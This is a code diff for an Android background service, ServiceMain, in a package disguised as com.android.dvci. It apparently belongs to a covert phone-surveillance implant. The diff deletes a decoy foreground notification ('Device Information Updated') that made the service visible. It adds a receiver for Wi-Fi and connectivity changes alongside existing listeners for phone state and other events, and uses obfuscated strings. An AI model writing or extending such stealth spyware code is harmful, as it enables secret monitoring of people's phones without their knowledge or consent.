@@ -1,11 +1,11 @@
 package com.android.dvci;
 
-import android.app.Notification;
-import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.res.Configuration;
+import android.net.ConnectivityManager;
+import android.net.wifi.WifiManager;
 import android.os.IBinder;
 import android.widget.Toast;
 
@@ -14,6 +14,7 @@ import com.android.dvci.listener.BAc;
 import com.android.dvci.listener.BC;
 import com.android.dvci.listener.BSm;
 import com.android.dvci.listener.BSt;
+import com.android.dvci.listener.WR;
 import com.android.dvci.util.Check;
 import com.android.mm.M;
 
@@ -22,12 +23,13 @@ import com.android.mm.M;
  */
 public class ServiceMain extends Service {
     private static final String TAG = "ServiceCore"; //$NON-NLS-1$
+
     BSt bst = new BSt();
     BAc bac = new BAc();
     BSm bsm = new BSm();
-    BC bc= new BC();
+    BC bc = new BC();
+    WR wr = new WR();
 
-    private boolean needsNotification = false;
     private Core core;
 
     @Override
@@ -49,31 +51,8 @@ public class ServiceMain extends Service {
             return;
         }
 
-        //M.init(getApplicationContext());
-
         if (Cfg.DEBUG) {
             Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
-        }
-
-        // TODO: verificare che needsNotification serva.
-        needsNotification = false; // Root.isNotificationNeeded();
-
-        // E' sempre false se Cfg.ACTIVITY = false
-        if (needsNotification == true) {
-            Notification note = new Notification(R.drawable.notify_icon, "Device Information Updated",
-                    System.currentTimeMillis());
-
-            Intent i = new Intent(this, LocalActivity.class);
-
-            i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-
-            PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
-
-            // Activity Name and Displayed Text
-            note.flags |= Notification.FLAG_AUTO_CANCEL;
-            note.setLatestEventInfo(this, "", "", pi);
-
-            startForeground(1260, note);
         }
 
         if (Cfg.DEMO) {
@@ -127,10 +106,6 @@ public class ServiceMain extends Service {
 
         core.Stop();
         core = null;
-
-        if (needsNotification == true) {
-            stopForeground(true);
-        }
     }
 
     private void registerReceivers() {
@@ -150,6 +125,12 @@ public class ServiceMain extends Service {
         iBc.addAction(M.e("android.intent.action.PHONE_STATE"));
         registerReceiver(bc, iBc);
 
+        // WiFi status manager
+        IntentFilter iWr = new IntentFilter();
+        iWr.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
+        iWr.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
+        registerReceiver(wr, iWr);
+
     }
 
     private void unregisterReceiver() {
@@ -157,6 +138,7 @@ public class ServiceMain extends Service {
         unregisterReceiver(bac);
         unregisterReceiver(bsm);
         unregisterReceiver(bc);
+        unregisterReceiver(wr);
     }
 
     @Override
